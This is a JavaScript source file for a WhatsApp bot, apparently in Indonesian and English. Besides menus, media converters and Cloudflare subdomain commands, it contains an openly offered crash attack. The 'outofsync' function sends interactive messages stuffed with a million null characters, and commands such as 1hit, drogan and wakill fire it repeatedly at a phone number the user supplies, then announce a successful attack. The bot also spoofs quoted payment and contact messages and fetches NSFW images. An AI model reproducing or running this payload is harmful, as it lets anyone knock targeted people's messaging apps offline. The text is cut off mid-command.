module.exports = async (ken, m, store) => {
try {
const body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
const budy = (typeof m.text == 'string' ? m.text : '')
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!™©®Δ^βα¦|/\\©^]/gi) : '.'
const isCmd = body.startsWith(prefix)
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const from = m.key.remoteJid
const cmd = prefix + command
const args = body.trim().split(/ +/).slice(1)
const rdm = () =>{
const randomNumbers = [];
for (let i = 0; i < 10; i++) {
  const randomNumber = Math.floor(Math.random() * 10);
  randomNumbers.push(randomNumber);
}
return randomNumbers.join('')
}
const makeid = rdm()
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const bugres = 'バグが進行中です。ちょっと待ってください!'
const qmsg = (quoted.msg || quoted)
const sender = m.key.fromMe ? (ken.user.id.split(':')[0]+'@s.whatsapp.net' || ken.user.id) : (m.key.participant || m.key.remoteJid)
const text = q = args.join(" ")
const botNumber = await ken.decodeJid(ken.user.id)
const isOwner = m.sender == owner+"@s.whatsapp.net" ? true : m.sender == botNumber ? true : false
const isGroup = m.chat.endsWith('@g.us')
const senderNumber = m.sender.split('@')[0]
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)
const groupMetadata = isGroup ? await ken.groupMetadata(m.chat) : {}
let participant_bot = isGroup ? groupMetadata?.participants?.find((v) => v.id == botNumber) : ''
let participant_sender = isGroup ? groupMetadata?.participants?.find((v) => v.id == m.sender) : ''
const isBotAdmin = participant_bot?.admin !== null ? true : false
const isAdmin = participant_sender?.admin !== null ? true : false
const { version } = require("./package.json")
const { runtime, getRandom, getTime, tanggal, toRupiah, telegraPh, pinterest, ucapan, generateProfilePicture, getBuffer, fetchJson } = require('./all/function.js')
const { toAudio, toPTT, toVideo, ffmpeg } = require("./all/converter.js")
const contacts = JSON.parse(fs.readFileSync("./all/database/contacts.json"))
const reseller = JSON.parse(fs.readFileSync("./all/database/reseller.json"))
let isReseller = reseller.includes(m.sender)
const pler = JSON.parse(fs.readFileSync('./all/database/idgrup.json').toString())
const jangan = m.isGroup ? pler.includes(m.chat) : false
const crypto = require('crypto');
if (isCmd) {
console.log(chalk.yellow.bgCyan.bold(namabot), color(`[ PESAN ]`, `blue`), color(`FROM`, `blue`), color(`${senderNumber}`, `blue`), color(`Text :`, `blue`), color(`${cmd}`, `white`))
}

const qbug = {key: {remoteJid: 'status@broadcast', fromMe: false, participant: '0@s.whatsapp.net'}, message: {listResponseMessage: {title: `Hello My Friends`
}}}

let ppuser
try {
ppuser = await ken.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://i.ibb.co/VYGGYdz/file-6682.jpg'
}

async function qckaizen(teks) {
      const nedd = {
        contextInfo: {
          forwardingScore: 999,
          isForwarded: true,
          forwardedNewsletterMessageInfo: {
            newsletterName: `Channel kaizen`,
            newsletterJid: "120363327641576587@newsletter",
          },
          externalAdReply: {
            showAdAttribution: true,
            title: `© Script Creator kaizen`,
            body: ``,
            previewType: "VIDEO",
            thumbnail: fs.readFileSync("./media/kaizen.jpg"),
            sourceUrl: "https://whatsapp.com/channel/0029VaoOFdcElah2CYOc0R02"
          },
        },
        text: teks,
      };
      return ken.sendMessage(m.chat, nedd, {
        quoted: m
      });
    }

async function outofsync(number) {
    await ken.relayMessage(number, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "@𝗱𝗲𝘃𝗼𝗿𝘀𝗶𝘅 • #𝘀𝗵𝗼𝘄𝗼𝗳𝗯𝘂𝗴 🩸",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: "\u0000".repeat(1000000),
                        version: 3
                    }
                }
            }
        }
    }, { participant: { jid: number}});
}

async function kenReply(teks) {
      return ken.sendMessage(m.chat, {
        text: `${teks}`,
        contextInfo: {
          forwardingScore: 999,
          isForwarded: true,
          forwardedNewsletterMessageInfo: {
            newsletterName: `Channel kaizen`,
            newsletterJid: "120363327641576587@newsletter",
          },
          mentionedJid: [m.sender],
          externalAdReply: {
            showAdAttribution: true,
            thumbnailUrl: ppuser,
            title: "｢ ACCESS DENIED ｣",
            body: "© Powered By Kaizen",
            previewType: "PHOTO",
            sourceUrl: "https://whatsapp.com/channel/0029VaoOFdcElah2CYOc0R02"
          }
        }
      }, { quoted: m });
    }

const fkontak = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { 'contactMessage': { 'displayName': `${pushname}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;Vinzx,;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': { url: 'https://img100.pixhost.to/images/155/533950625_skyzopedia.jpg' }}}}
function parseMention(text = '') {
return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
}

const qpayment = {
key: {
remoteJid: '0@s.whatsapp.net',
fromMe: false,
id: `ownername`,
participant: '0@s.whatsapp.net'
},
message: {
requestPaymentMessage: {
currencyCodeIso4217: "USD",
amount1000: 999999999,
requestFrom: '0@s.whatsapp.net',
noteMessage: {
extendedTextMessage: {
text: namabot
}},
expiryTimestamp: 999999999,
amount: {
value: 91929291929,
offset: 1000,
currencyCode: "INR"
}}}}

const qchanel = {
key: {
remoteJid: 'status@broadcast',
fromMe: false,
participant: '0@s.whatsapp.net'
},
message: {
newsletterAdminInviteMessage: {
newsletterJid: `120363327641576587@newsletter`,
newsletterName: `Hore`,
jpegThumbnail: "",
caption: `Powered By ${namaowner}`,
inviteExpiration: Date.now() + 1814400000
}
}}

const qtoko = {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
}, message: {
"productMessage": {
"product": {
"productImage": {
"mimetype": "image/jpeg",
"jpegThumbnail": "",
},
"title": `Pterodactyl Server By ${namaowner}`,
"description": null,
"currencyCode": "IDR",
"priceAmount1000": "9999999999",
"retailerId": `Powered By ken`,
"productImageCount": 1
},
"businessOwnerJid": `0@s.whatsapp.net`
}}
}

const qtext = { key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "0@s.whatsapp.net"} : {}) },'message': {extendedTextMessage: {text: "Thank you for using my services"}}}

const qdoc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {documentMessage: {title: `Powered By ${namaowner}`, jpegThumbnail: ""}}}

const qloc = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `WhatsApp Bot JPM By Kaizen`,jpegThumbnail: ""}}}

const qloc2 = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `WhatsApp Bot Pushkontak By Kaizen`,jpegThumbnail: ""}}}

const qkontak = {
key: {
participant: `0@s.whatsapp.net`,
...(botNumber ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
'contactMessage': {
'displayName': `${namaowner}`,
'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;ttname,;;;\nFN:ttname\nitem1.TEL;waid=6285808448146:+62 858-0844-8146\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
sendEphemeral: true
}}
}

if (global.owneroff && !isCmd) {
if (!isGroup && !isOwner) {
let teks = `*Hai Kak* @${m.sender.split('@')[0]}

Maaf *Ownerku Sedang Offline*, Silahkan Tunggu Owner Kembali Online & Jangan Spam Chat`
return ken.sendMessage(m.chat, {text: `${teks}`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {
showAdAttribution: true, thumbnail: fs.readFileSync("./media/ownermode.jpg"), renderLargerThumbnail: false, title: "｢ OWNER OFFLINE MODE ｣", mediaUrl: linkgc, sourceUrl: linkyt, previewType: "PHOTO"}}}, {quoted: null})
}}

let example = (teks) => {
return `\n*Contoh Penggunaan :*\nketik *${cmd}* ${teks}\n`
}

var resize = async (image, width, height) => {
let oyy = await Jimp.read(image)
let kiyomasa = await oyy.resize(width, height).getBufferAsync(Jimp.MIME_JPEG)
return kiyomasa
}

function capital(string) {
  return string.charAt(0).toUpperCase() + string.slice(1);
}

const createSerial = (size) => {
return crypto.randomBytes(size).toString('hex').slice(0, size)
}


switch (command) {
case "menu": {

   await ken.sendMessage(m.chat, { react: { text: `🥵`, key: m.key } });
      
      const fs = require('fs'); // Untuk baca file
    


    const captionnya = `
> assalamoallkum 👋 ↯ ${pushname} I am a WhatsApp robot assembled by Pain to help you 

         _*<↯> COMMEND <↯>*_
  *IF YOU WANT TO SEE THE MENU PLEASE TYPE .bugmenu TO SEE ALL MENUS*
`

await ken.sendMessage(m.chat, { 
	           video: fs.readFileSync('./all/gebylucukk.mp4'),
	           gifPlayback: true,
	           caption: captionnya,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: global.namabot,
                            body: global.namaCreator,
                            thumbnailUrl: global.imageurl,
                            sourceUrl: global.isLink,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: fkontak
                    })
                    
     await ken.sendMessage(m.chat, {
                        audio: fs.readFileSync('./all/kiyowo.mp3'),
                        mimetype: "audio/mpeg",
                        ptt: true
                    }, {
                        quoted: m
                    })
                }
break
case "bugmenu":

//react emoji 
await ken.sendMessage(m.chat, { react: { text: `🫥`, key: m.key } });

    //GIF dan audio

    const captionnyaa = `
> assalamoallkum 👋 ${pushname} I'm a Whatsapp Robot Ready to Help You <↯>

 [ \`INFORMATION BOT\` ]
𖤐 Name Bot : Mr xxx
𖤐 bahan bug : 923492091511
𖤐 Version : 1.0
𖤐 Type : Case

*\`want to be premium entry\`*
https://whatsapp.com/channel/0029ValNvcn9hXF0GBPgzF1K

↯ [ \`BUG UI HARD\` ] ↯
↯ 1hit ↯ number
↯ b4udrogan ↯ number
↯ crash ↯ number
↯ drogan ↯ number
↯ sadsatan ↯ number
↯ mryyy ↯ number
↯ wakill ↯ number
↯ onekill ↯ number
↯ thebotwar ↯ number

↯ see allmenu

↯ [ \`B4U MENU\` ] ↯
↯ hidetag
↯ tagall
↯ pinteres
↯ kick
↯ rvo
↯ tourl
↯ brat


↯ [ \`OWNER MENU\` ] ↯
↯ addmurbug
↯ delmurbug
↯ addprem
↯ delprem
↯ addowner
↯ delowner
↯ self
↯ public

*\`want to be premium entry\`*
https://whatsapp.com/channel/0029ValNvcn9hXF0GBPgzF1K

`

   
await ken.sendMessage(m.chat, { 
	           video: fs.readFileSync('./all/gebylucukk.mp4'),
	           gifPlayback: true,
	           caption: captionnyaa,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: global.namabot,
                            body: global.namaCreator,
                            thumbnailUrl: global.imageurl,
                            sourceUrl: global.isLink,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: fkontak
                    })
                    
     await ken.sendMessage(m.chat, {
                        audio: fs.readFileSync('./all/kiyowo.mp3'),
                        mimetype: "audio/mpeg",
                        ptt: true
                    }, {
                        quoted: m
                    })
                
break
case "allmenu": {

let teksmenu = `[ 𝙼𝙰𝙸𝙽𝙼𝙴𝙽𝚄 ]
➯ ${prefix}yts
➯ ${prefix}pin
➯ ${prefix}txt2img
  
[ 𝙲𝙾𝙽𝚅𝙴𝚁𝚃𝙴𝚁 ]
➯ ${prefix}tomp3
➯ ${prefix}tovn
➯ ${prefix}toptv
➯ ${prefix}tts
  
[ 𝙳𝙾𝙼𝙰𝙸𝙽𝙼𝙴𝙽𝚄 ]
➯ ${prefix}listdomain
➯ ${prefix}listsubdo
➯ ${prefix}delsubdo

[ 𝙿𝙰𝚈𝙼𝙴𝙽𝚃𝙼𝙴𝙽𝚄 ]
➯ ${prefix}danapay
➯ ${prefix}gopaypay
➯ ${prefix}qrispay
  
[ 𝙿𝚄𝚂𝙷𝙼𝙴𝙽𝚄 ]
➯ ${prefix}pushkontak
➯ ${prefix}pushkontak1
➯ ${prefix}listgc
➯ ${prefix}cekidgc

[ 𝙷𝙴𝙽𝚃𝙰𝙸𝙼𝙴𝙽𝚄 ]
➯ ${prefix}chentai
➯ ${prefix}ihentai
➯ ${prefix}bhentai

[ 𝙿𝙰𝙽𝙴𝙻𝙼𝙴𝙽𝚄 ]
➯ ${prefix}addres
➯ ${prefix}delres
➯ ${prefix}listres
➯ ${prefix}1gb
➯ ${prefix}2gb
➯ ${prefix}3gb
➯ ${prefix}4gb
➯ ${prefix}5gb
➯ ${prefix}6gb
➯ ${prefix}7gb
➯ ${prefix}8gb
➯ ${prefix}9gb
➯ ${prefix}10gb
➯ ${prefix}cadp
➯ ${prefix}listp
➯ ${prefix}delp
  
[ 𝙾𝚆𝙽𝙴𝚁𝙼𝙴𝙽𝚄 ]
➯ ${prefix}modeoff
➯ ${prefix}modeon
➯ ${prefix}done
➯ ${prefix}public
➯ ${prefix}self
➯ ${prefix}anticall
➯ ${prefix}autoread
➯ ${prefix}welcome
➯ ${prefix}setthumbnail
➯ ${prefix}setnamabot
➯ ${prefix}setbiobot
`
return qckaizen(teksmenu)
}
break
case "mainmenu": {

let teksmenu = `[ 𝙼𝙰𝙸𝙽𝙼𝙴𝙽𝚄 ]
➯ ${prefix}yts
➯ ${prefix}pin
➯ ${prefix}txt2img
`
return qckaizen(teksmenu)
}
break
case "pushkontakmenu": {

let teksmenu = `[ 𝙿𝚄𝚂𝙷𝙼𝙴𝙽𝚄 ]
➯ ${prefix}pushkontak
➯ ${prefix}pushkontak1
➯ ${prefix}listgc
➯ ${prefix}cekidgc
`
return qckaizen(teksmenu)
}
break
case "hentaimenu": {

let teksmenu = `[ 𝙷𝙴𝙽𝚃𝙰𝙸𝙼𝙴𝙽𝚄 ]
➯ ${prefix}chentai
➯ ${prefix}ihentai
➯ ${prefix}bhentai
`
return qckaizen(teksmenu)
}
break
case "panelmenu":{
  
let teksmenu = `[ 𝙿𝙰𝙽𝙴𝙻𝙼𝙴𝙽𝚄 ]
➯ ${prefix}addres
➯ ${prefix}delres
➯ ${prefix}listres
➯ ${prefix}1gb
➯ ${prefix}2gb
➯ ${prefix}3gb
➯ ${prefix}4gb
➯ ${prefix}5gb
➯ ${prefix}6gb
➯ ${prefix}7gb
➯ ${prefix}8gb
➯ ${prefix}9gb
➯ ${prefix}10gb
➯ ${prefix}cadp
➯ ${prefix}listp
➯ ${prefix}delp`
return qckaizen(teksmenu)
}
break
case "convertmenu": {

let teksmenu = `[ 𝙲𝙾𝙽𝚅𝙴𝚁𝚃𝙴𝚁 ]
➯ ${prefix}tomp3
➯ ${prefix}tovn
➯ ${prefix}toptv
➯ ${prefix}tts
`
return qckaizen(teksmenu)
}
break
case "paymentmenu": {

let teksmenu = `[ 𝙿𝙰𝚈𝙼𝙴𝙽𝚃𝙼𝙴𝙽𝚄 ]
➯ ${prefix}danapay
➯ ${prefix}gopaypay
➯ ${prefix}qrispay
`
return qckaizen(teksmenu)
}
break
case "domainmenu": {

let teksmenu = `[ 𝙳𝙾𝙼𝙰𝙸𝙽𝙼𝙴𝙽𝚄 ]
➯ ${prefix}listdomain
➯ ${prefix}listsubdo
➯ ${prefix}delsubdo
`
return qckaizen(teksmenu)
}
break
case "ownermenu": {

let teksmenu = `[ 𝙾𝚆𝙽𝙴𝚁𝙼𝙴𝙽𝚄 ]
➯ ${prefix}modeoff
➯ ${prefix}modeon
➯ ${prefix}done
➯ ${prefix}public
➯ ${prefix}self
➯ ${prefix}anticall
➯ ${prefix}autoread
➯ ${prefix}welcome
➯ ${prefix}setthumbnail
➯ ${prefix}setnamabot
➯ ${prefix}setbiobot
`
return qckaizen(teksmenu)
}
break
case "chentai": {
  if(!isOwner) return kenReply(msg.owner)
  qckaizen(msg.wait)
  let res = await fetch('https://api.waifu.pics/nsfw/blowjob')
    if (!res.ok) throw await res.text()
    let json = await res.json()
    if (!json.url) throw 'Error!'
    ken.sendMessage(m.chat, {
      image: {
        url: json.url
      }
    }, { quoted: qchanel })
}
break
case "ihentai": case "bhentai":{
  if(!isOwner) return kenReply(msg.owner)
  qckaizen(msg.wait)
  let res = await fetch('https://api.waifu.pics/nsfw/trap')
    if (!res.ok) throw await res.text()
    let json = await res.json()
    if (!json.url) throw 'Error!'
    ken.sendMessage(m.chat, {
      image: {
        url: json.url
      }
    }, { quoted: qchanel })
}
break
case "txt2img": {
  if (!text) return qckaizen(example("teks"))
  qckaizen(msg.wait)
  try {
    var { data } = await axios({
      method: "GET",
      url: "https://hercai.onrender.com/v3/text2image",
      params: {
        prompt: text
      }
    })
    ken.sendMessage(m.chat, {
      image: {
        url: data.url
      }
    }, { quoted: qchanel })
  } catch (e) {
    qckaizen(e.message)
    console.log(e)
  }
}
break
case "trxoff": case "modeoff": {

if (!isOwner) return kenReply(msg.owner)
global.owneroff = true
qckaizen('Berhasil Mengganti Ke Mode *Owner Off*')
}
break
case "trxon": case "modeon": {

if (!isOwner) return kenReply(msg.owner)
global.owneroff = false
qckaizen('Berhasil Mengganti Ke Mode *Owner ON*')
}
break
case "yts": {

if (!text) return qckaizen(example("Dj Tiktok"))
await qckaizen(msg.wait)
await yts(text).then(async (data) => {
if (data.all.length == 0) return m.reply(msg.error)
let teks = '\n*🔎Hasil Pencarian YOUTUBE*\n\n'
for (let i of data.all) {
teks += `*◦ Judul :* ${i.title}
*◦ Channel :* ${i.author?.name || "unknown"}
*◦ Durasi :* ${i?.timestamp || "unknown"}
*◦ Link Url :* ${i.url}\n\n`
}
qckaizen(teks)
}).catch(err => m.reply(err.toString()))
}
break
case "setthumb": case "setthumbnail": {

if (!isOwner) return kenReply(msg.owner)
if (!/image/g.test(mime)) return qckaizen("Kirim/Balas Foto")
await ken.downloadAndSaveMediaMessage(qmsg, "./media/kaizen.jpg", false)
qckaizen("Berhasil Mengganti Foto Thumbnail Menu ✅")
}
break
case "setnamabot": {

if (!isOwner) return kenReply(msg.owner)
if (!text) return qckaizen(example('teksnya'))
ken.updateProfileName(text)
qckaizen("Berhasil Mengganti Nama Bot ✅")
}
break
case "setbio": case "setbiobot": {

if (!isOwner) return kenReply(msg.owner)
if (!text) return qckaizen(example('teksnya'))
ken.updateProfileStatus(text)
qckaizen("Berhasil Mengganti Bio Bot ✅")
}
break
case "listdomain": {

var teks = `*List Domain Yang Tersedia :*

.domain1 ${global.tld1}
.domain2 ${global.tld2}
.domain3 ${global.tld3}
.domain4 ${global.tld4}

*Contoh Cara Membuat Subdomain :*
ketik *.domain1* hostname|ipvps

*Contoh Cara Melihat Subdomain :*
ketik *.listsubdomain domain1*
`
qckaizen(teks)
}
break
case "listsubdomain": case "listsubdo": {

if (!isOwner && !isReseller) return kenReply(msg.owner)
if (!args[0]) return qckaizen(example("domain1\n\nketik *.listdomain*\nUntuk melihat list domainnya"))
let zonenya
let apinya
let dom = args[0].toLowerCase()
if (/domain1/.test(dom)) {
zonenya = global.zone1
apinya = global.apitoken1
} else if (/domain2/.test(dom)) {
zonenya = global.zone2
apinya = global.apitoken2
} else if (/domain3/.test(dom)) {
zonenya = global.zone3
apinya = global.apitoken3
} else if (/domain4/.test(dom)) {
zonenya = global.zone4
apinya = global.apitoken4
}
axios.get(
`https://api.cloudflare.com/client/v4/zones/${zonenya}/dns_records`,{
headers: {
Authorization: "Bearer " + `${apinya}`,
"Content-Type": "application/json",
},
}).then(async (res) => {
if (res.data.result.length < 1) return qckaizen("Tidak Ada Subdomain")
var teks = `*🌐 LIST SUBDOMAIN ${dom.toUpperCase()}*\n\n*Total Subdomain :* ${res.data.result.length}\n\n`
await res.data.result.forEach(e => teks += `*Domain :* ${e.name}\n*IP :* ${e.content}\n\n`)
return qckaizen(teks)
})
}
break
case "domain1": case "domain2": case "domain3": case "domain4": {

if (!isOwner && !isReseller) return kenReply(msg.owner)
if (!text) return qckaizen(example("host|ip"))
if (!text.split("|")) return qckaizen(example("host|ip"))
let zonenya
let apinya
let tldnya
let dom = args[0].toLowerCase()
if (/domain1/.test(command)) {
zonenya = global.zone1
apinya = global.apitoken1
tldnya = global.tld1
} else if (/domain2/.test(command)) {
zonenya = global.zone2
apinya = global.apitoken2
tldnya = global.tld2
} else if (/domain3/.test(command)) {
zonenya = global.zone3
apinya = global.apitoken3
tldnya = global.tld3
} else if (/domain4/.test(command)) {
zonenya = global.zone4
apinya = global.apitoken4
tldnya = global.tld4
}
async function subDomain1(host, ip) {
return new Promise((resolve) => {
axios.post(
`https://api.cloudflare.com/client/v4/zones/${zonenya}/dns_records`,
{ type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tldnya, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
{
headers: {
Authorization: "Bearer " + apinya,
"Content-Type": "application/json",
},
}).then((e) => {
let res = e.data
if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content })
}).catch((e) => {
let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e
let err1Str = String(err1)
resolve({ success: false, error: err1Str })
})
})}
   
let raw1 = text
if (!raw1) return qckaizen(example("host|ip"))
let host1 = raw1.split("|")[0].trim().replace(/[^a-z0-9.-]/gi, "")
if (!host1) return qckaizen("Hostname Tidak Valid!, Hostname Hanya Mendukung Tanda Strip(-) Atau Titik(.)")
let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
if (!ip1 || ip1.split(".").length < 4) return qckaizen(ip1 ? "IP Tidak Valid!" : "Isi IP Servernya!")
await subDomain1(host1.toLowerCase(), ip1).then((e) => {
if (e['success']) qckaizen(`*Subdomain Berhasil Dibuat ✅*\n\n*Domain Induk 🌐*\n${tldnya}\n*IP 📡*\n${e['ip']}\n*Subdomain 🌐*\n${e['name']}`)
else qckaizen(`${e['error']}`)
})}
break
case "delsubdo": case "delsubdomain": {

if (!isOwner) return kenReply(msg.owner)
if (!text) return qckaizen(example("domain1|subdo\n\nUntuk melihat listdomain ketik *.listdomain*"))
if (!text.split("|")) return qckaizen(example("domain1|subdo\n\nUntuk melihat listdomain ketik *.listdomain*"))
var [pusat, sub] = text.split("|")
var zonenya
var apinya
var tldnya
if (/domain1/.test(pusat)) {
zonenya = global.zone1
apinya = global.apitoken1
tldnya = global.tld1
} else if (/domain2/.test(pusat)) {
zonenya = global.zone2
apinya = global.apitoken2
tldnya = global.tld2
} else if (/domain3/.test(pusat)) {
zonenya = global.zone3
apinya = global.apitoken3
tldnya = global.tld3
} else if (/domain4/.test(pusat)) {
zonenya = global.zone4
apinya = global.apitoken4
tldnya = global.tld4
} else return qckaizen("Domain Tidak Ditemukan")
if (!sub.includes(".")) return qckaizen("Format Subdomain Tidak Valid!")
var host = sub.toLowerCase()
var dom = null
var id = null
await axios.get(`https://api.cloudflare.com/client/v4/zones/${zonenya}/dns_records`, {
headers: {
Authorization: "Bearer " + apinya,
"Content-Type": "application/json",
},
}).then(async (res) => {
await res.data.result.forEach((e) => {
if (e.name == host) {
dom = e.name
id = e.id
}})
})
if (dom == null && id == null) return qckaizen("Subdomain Tidak Ditemukan")
await fetch(`https://api.cloudflare.com/client/v4/zones/${zonenya}/dns_records/${id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
Authorization: "Bearer " + apinya,
"Content-Type": "application/json",
}
})
qckaizen(`Berhasil Menghapus Subdomain *${dom}* Dari Domain *${tldnya}*`)
}
break
case 'xbug':
case 'mryyy':
case 'drogan':
case 'b4udrogan':
case 'sadsatan':
case 'onekill':
case 'thebotwar':
case '1hit':
case 'wakill': {
if (!isOwner) return kenReply(msg.owner)
if (!q) return kenReply(`Example: ${prefix + command} 92×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
kenReply(bugres)
    for (let i = 0; i < 3; i++) {
        await outofsync(m.chat);
await outofsync(target, true)
await outofsync(target)
await outofsync(target, true)
await outofsync(target)
await outofsync(target, true)
await outofsync(target)
await outofsync(target, true)
await outofsync(target)
await outofsync(target, true)
await outofsync(target)
await outofsync(target, true)
await outofsync(target, true)
await outofsync(target)
await outofsync(target, true)
await outofsync(target)
await outofsync(target, true)
await outofsync(target)
await outofsync(target, true)
await outofsync(target)
await outofsync(target, true)
await outofsync(target)
await outofsync(target, true)
}
kenReply(`Suscesfully attack to ${target}✅`)
}
break
case "tts": {

if (!text) return qckaizen(example("Hallo saya manusia"))
if (text.length >= 300) return qckaizen("Jumlah huruf harus di bawah 300!")
qckaizen(msg.wait)
let id = 'id_001'
try {
const { data } = await axios.post("https://tiktok-tts.weilnet.workers.dev/api/generation", {
    "text": text,
    "voice": id
})
ken.sendMessage(m.chat, { audio: Buffer.from(data.data, "base64"), mimetype: "audio/mp4" }, {quoted: qchanel})
} catch (e) {
return qckaizen(e.toString())
}
}
break
case "toptv": {

if (/video/.test(qmsg.mimetype)) {
if ((qmsg).seconds > 30) return qckaizen("Durasi vidio maksimal 30 detik!")
let ptv = await generateWAMessageFromContent(m.chat, proto.Message.fromObject({ ptvMessage: qmsg }), { userJid: m.chat, quoted: qchanel })
ken.relayMessage(m.chat, ptv.message, { messageId: ptv.key.id })
} else { 
return qckaizen(example("dengam mengirim/balas vidio"))
}
}
break
case "tovn": case "toptt": {

if (!/video|audio/.test(mime) && !/audio/.test(mime)) return qckaizen(example('dengan mengirim audio/vidio'))
qckaizen(msg.wait)
await ken.downloadMediaMessage(qmsg).then(async (res) => {
let anu = await toPTT(res, 'mp4')
ken.sendMessage(m.chat, {audio: anu, mimetype: 'audio/mpeg', ptt: true}, {quoted : qchanel}) 
})
}
break
case "tomp3": {

if (!/video/.test(mime) && !/audio/.test(mime)) return qckaizen(example('dengan mengirim vidio'))
if ((qmsg).seconds > 30) return qckaizen("Durasi vidio maksimal 30 detik")
qckaizen(msg.wait)
await ken.downloadMediaMessage(qmsg).then(async (res) => {
let anu = await toAudio(res, 'mp4')
ken.sendMessage(m.chat, {audio: anu, mimetype: 'audio/mpeg'}, {quoted : qchanel}) 
})
}
break
case "public": {

if (!isOwner) return kenReply(msg.owner)
ken.public = true
qckaizen("Berhasil mengganti mode bot menjadi *Public*")
}
break
case "self": {

if (!isOwner) return kenReply(msg.owner)
ken.public = false
qckaizen("Berhasil mengganti mode bot menjadi *Self*")
}
break
case 'pinterest':
case 'pin':{
if(!text)return qckaizen(example("tobrut"))
const {GOOGLE_IMG_SCRAP} = require('google-img-scrap');
let cariimg = await GOOGLE_IMG_SCRAP({search: text,limit: 6,domains: ["pinterest.com"]})
let imgs = cariimg.result
let imgres = cariimg.result.length
if(imgres==0)return qckaizen("Hasil tidak di temukan")
let lim = () => {
  if(imgres>5){return 5}else{return imgres} }
let lmt = lim()
let arrcard = []
for(let i=0;i<lmt;i++){
let eek = {
"header": proto.Message.InteractiveMessage.Header.create({...(await prepareWAMessageMedia({ image : await getBuffer(imgs[i].url)}, { upload: ken.waUploadToServer})),
title: `*[PINTEREST SEARCH]*`,
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
"body": {
"text": `Hasil ${i+1} pinterest`
},
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"Link","url":"${imgs[i].url}","merchant_url":"https://www.google.co.id"}`
}
]
})
   }
    arrcard.push(eek)
    await sleep(2000)
  }

let ctamsg = generateWAMessageFromContent(m.chat, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body:{text:"*Berikut Hasil Pencarian Anda*"},
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.create({
        "cards": arrcard,
        "messageVersion": 1
       }
    )
})
}
}
}, {});
await ken.relayMessage(ctamsg.key.remoteJid, ctamsg.message, {
messageId: ctamsg.key.id
})

}
break
case "owner": {

ken.sendContact(m.chat, [owner], "Developer Bot WhatsApp", null, {contextInfo: {
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true, 
thumbnail: await fs.readFileSync("./media/kaizen.jpg"), 
title: `© Copyright ${global.namabot}`, 
renderLargerThumbnail: true, 
sourceUrl: global.linkyt, 
mediaType: 1
}}})
}
break
case "welcome": {

if (!isOwner) return kenReply(msg.owner)
if (!text) return qckaizen(example("on/off\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot"))
if (text.toLowerCase() == "on") {
if (welcome) return qckaizen("*Welcome* Sudah Aktif!\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot")
welcome = true
